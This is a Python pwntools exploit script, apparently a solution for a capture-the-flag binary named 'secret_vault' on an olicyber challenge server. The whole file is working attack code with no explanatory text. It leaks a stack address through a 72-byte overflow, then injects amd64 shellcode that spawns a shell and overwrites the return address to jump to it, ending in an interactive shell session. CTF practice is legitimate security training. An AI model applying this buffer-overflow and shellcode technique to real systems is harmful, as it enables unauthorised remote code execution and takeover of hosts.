from pwn import *

context.arch = 'amd64'
if args.REMOTE:
     conn = remote('vault.challs.olicyber.it', 10006)
else:
     conn = gdb.debug('/home/mattia/Downloads/secret_vault', '''
        b *main
        c             
     ''')

response = conn.recvuntil(b'>')
print(response.decode())
conn.sendline(b'1')


conn.recvuntil(b':')
payload = b'a' *72
conn.sendline(payload)

conn.recvuntil(b'in')   
ret_addr = conn.recvuntil(b'!')
ret_addr = ret_addr.decode()[:-1]
print(ret_addr)
ret_addr = int(ret_addr, 16)

conn.recvuntil(b'>')

conn.sendline(b'1')

payload = asm(shellcraft.amd64.linux.sh())
payload += b'a' * 24
payload += p64(0)
payload += b'b' * 8
payload += p64(ret_addr)

conn.sendline(payload)
conn.recvuntil(b'>')

conn.sendline(b'3')

conn.interactive()
